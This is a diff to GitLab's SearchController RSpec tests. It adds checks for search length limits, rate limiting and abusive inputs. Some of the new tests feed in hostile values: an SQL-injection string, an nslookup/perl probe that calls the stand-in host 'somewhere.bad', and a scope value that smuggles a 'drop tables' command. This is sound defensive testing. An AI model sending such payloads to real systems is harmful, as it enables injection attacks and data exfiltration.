@@ -127,21 +127,26 @@ RSpec.describe SearchController do
 
           context 'check search term length' do
             let(:search_queries) do
-              char_limit = SearchService::SEARCH_CHAR_LIMIT
-              term_limit = SearchService::SEARCH_TERM_LIMIT
+              char_limit = Gitlab::Search::Params::SEARCH_CHAR_LIMIT
+              term_limit = Gitlab::Search::Params::SEARCH_TERM_LIMIT
+              term_char_limit = Gitlab::Search::AbuseDetection::ABUSIVE_TERM_SIZE
               {
-                chars_under_limit: ('a' * (char_limit - 1)),
-                chars_over_limit: ('a' * (char_limit + 1)),
-                terms_under_limit: ('abc ' * (term_limit - 1)),
-                terms_over_limit: ('abc ' * (term_limit + 1))
+                chars_under_limit: (('a' * (term_char_limit - 1) + ' ') * (term_limit - 1))[0, char_limit],
+                chars_over_limit: (('a' * (term_char_limit - 1) + ' ') * (term_limit - 1))[0, char_limit + 1],
+                 terms_under_limit: ('abc ' * (term_limit - 1)),
+                terms_over_limit: ('abc ' * (term_limit + 1)),
+                term_length_over_limit: ('a' * (term_char_limit + 1)),
+                term_length_under_limit: ('a' * (term_char_limit - 1))
               }
             end
 
             where(:string_name, :expectation) do
-              :chars_under_limit | :not_to_set_flash
-              :chars_over_limit  | :set_chars_flash
-              :terms_under_limit | :not_to_set_flash
-              :terms_over_limit  | :set_terms_flash
+              :chars_under_limit       | :not_to_set_flash
+              :chars_over_limit        | :set_chars_flash
+              :terms_under_limit       | :not_to_set_flash
+              :terms_over_limit        | :set_terms_flash
+              :term_length_under_limit | :not_to_set_flash
+              :term_length_over_limit  | :not_to_set_flash # abuse, so do nothing.
             end
 
             with_them do
@@ -172,6 +177,12 @@ RSpec.describe SearchController do
 
               expect(response).to redirect_to new_user_session_path
             end
+
+            it 'redirects to login page when trying to circumvent the restriction' do
+              get :show, params: { scope: 'projects', project_id: non_existing_record_id, search: '*' }
+
+              expect(response).to redirect_to new_user_session_path
+            end
           end
 
           context 'for authenticated user' do
@@ -179,6 +190,14 @@ RSpec.describe SearchController do
               get :show, params: { scope: 'projects', search: '*' }
 
               expect(response).to have_gitlab_http_status(:ok)
+            end
+          end
+
+          context 'handling abusive search_terms' do
+            it 'succeeds but does NOT do anything' do
+              get :show, params: { scope: 'projects', search: '*', repository_ref: '-1%20OR%203%2B640-640-1=0%2B0%2B0%2B1' }
+              expect(response).to have_gitlab_http_status(:ok)
+              expect(assigns(:search_results)).to be_a Gitlab::EmptySearchResults
             end
           end
         end
@@ -232,8 +251,8 @@ RSpec.describe SearchController do
         it_behaves_like 'tracking unique hll events' do
           subject(:request) { get :show, params: { scope: 'projects', search: 'term' } }
 
-          let(:target_id) { 'i_search_total' }
-          let(:expected_type) { instance_of(String) }
+          let(:target_event) { 'i_search_total' }
+          let(:expected_value) { instance_of(String) }
         end
       end
 
@@ -271,9 +290,17 @@ RSpec.describe SearchController do
           expect(assigns[:search_objects].count).to eq(0)
         end
       end
+
+      it_behaves_like 'rate limited endpoint', rate_limit_key: :search_rate_limit do
+        let(:current_user) { user }
+
+        def request
+          get(:show, params: { search: 'foo@bar.com', scope: 'users' })
+        end
+      end
     end
 
-    describe 'GET #count' do
+    describe 'GET #count', :aggregate_failures do
       it_behaves_like 'when the user cannot read cross project', :count, { search: 'hello', scope: 'projects' }
       it_behaves_like 'with external authorization service enabled', :count, { search: 'hello', scope: 'projects' }
       it_behaves_like 'support for active record query timeouts', :count, { search: 'hello', scope: 'projects' }, :search_results, :json
@@ -305,13 +332,56 @@ RSpec.describe SearchController do
 
         expect(response).to have_gitlab_http_status(:ok)
 
-        expect(response.headers['Cache-Control']).to eq('no-store')
+        expect(response.headers['Cache-Control']).to eq('max-age=60, private')
+      end
+
+      it 'does NOT blow up if search param is NOT a string' do
+        get :count, params: { search: ['hello'], scope: 'projects' }
+        expect(response).to have_gitlab_http_status(:ok)
+        expect(json_response).to eq({ 'count' => '0' })
+
+        get :count, params: { search: { nested: 'hello' }, scope: 'projects' }
+        expect(response).to have_gitlab_http_status(:ok)
+        expect(json_response).to eq({ 'count' => '0' })
+      end
+
+      it 'does NOT blow up if repository_ref contains abusive characters' do
+        get :count, params: {
+          search: 'hello',
+          repository_ref: "(nslookup%20hitqlwv501f.somewhere.bad%7C%7Cperl%20-e%20%22gethostbyname('hitqlwv501f.somewhere.bad')%22)",
+          scope: 'projects'
+        }
+        expect(response).to have_gitlab_http_status(:ok)
+        expect(json_response).to eq({ 'count' => '0' })
+      end
+
+      it_behaves_like 'rate limited endpoint', rate_limit_key: :search_rate_limit do
+        let(:current_user) { user }
+
+        def request
+          get(:count, params: { search: 'foo@bar.com', scope: 'users' })
+        end
       end
     end
 
     describe 'GET #autocomplete' do
       it_behaves_like 'when the user cannot read cross project', :autocomplete, { term: 'hello' }
       it_behaves_like 'with external authorization service enabled', :autocomplete, { term: 'hello' }
+      it_behaves_like 'support for active record query timeouts', :autocomplete, { term: 'hello' }, :project, :json
+
+      it 'returns an empty array when given abusive search term' do
+        get :autocomplete, params: { term: ('hal' * 9000), scope: 'projects' }
+        expect(response).to have_gitlab_http_status(:ok)
+        expect(json_response).to match_array([])
+      end
+
+      it_behaves_like 'rate limited endpoint', rate_limit_key: :search_rate_limit do
+        let(:current_user) { user }
+
+        def request
+          get(:autocomplete, params: { term: 'foo@bar.com', scope: 'users' })
+        end
+      end
     end
 
     describe '#append_info_to_payload' do
@@ -326,9 +396,11 @@ RSpec.describe SearchController do
           expect(payload[:metadata]['meta.search.force_search_results']).to eq('true')
           expect(payload[:metadata]['meta.search.filters.confidential']).to eq('true')
           expect(payload[:metadata]['meta.search.filters.state']).to eq('true')
+          expect(payload[:metadata]['meta.search.project_ids']).to eq(%w(456 789))
+          expect(payload[:metadata]['meta.search.search_level']).to eq('multi-project')
         end
 
-        get :show, params: { scope: 'issues', search: 'hello world', group_id: '123', project_id: '456', confidential: true, state: true, force_search_results: true }
+        get :show, params: { scope: 'issues', search: 'hello world', group_id: '123', project_id: '456', project_ids: %w(456 789), search_level: 'multi-project', confidential: true, state: true, force_search_results: true }
       end
 
       it 'appends the default scope in meta.search.scope' do
@@ -341,9 +413,58 @@ RSpec.describe SearchController do
         get :show, params: { search: 'hello world', group_id: '123', project_id: '456' }
       end
     end
+
+    context 'abusive searches', :aggregate_failures do
+      let(:project) { create(:project, :public, name: 'hello world') }
+      let(:make_abusive_request) do
+        get :show, params: { scope: '1;drop%20tables;boom', search: 'hello world', project_id: project.id }
+      end
+
+      before do
+        enable_external_authorization_service_check
+      end
+
+      it 'returns EmptySearchResults' do
+        expect(Gitlab::EmptySearchResults).to receive(:new).and_call_original
+        make_abusive_request
+        expect(response).to have_gitlab_http_status(:ok)
+      end
+
+      context 'when the feature flag is disabled' do
+        before do
+          stub_feature_flags(prevent_abusive_searches: false)
+        end
+
+        it 'returns a regular search result' do
+          expect(Gitlab::EmptySearchResults).not_to receive(:new)
+          make_abusive_request
+          expect(response).to have_gitlab_http_status(:ok)
+        end
+      end
+    end
   end
 
   context 'unauthorized user' do
+    describe 'search rate limits' do
+      using RSpec::Parameterized::TableSyntax
+
+      let(:project) { create(:project, :public) }
+
+      where(:endpoint, :params) do
+        :show         | { search: 'hello', scope: 'projects' }
+        :count        | { search: 'hello', scope: 'projects' }
+        :autocomplete | { term: 'hello', scope: 'projects' }
+      end
+
+      with_them do
+        it_behaves_like 'rate limited endpoint', rate_limit_key: :search_rate_limit_unauthenticated do
+          def request
+            get endpoint, params: params.merge(project_id: project.id)
+          end
+        end
+      end
+    end
+
     describe 'GET #opensearch' do
       render_views
 
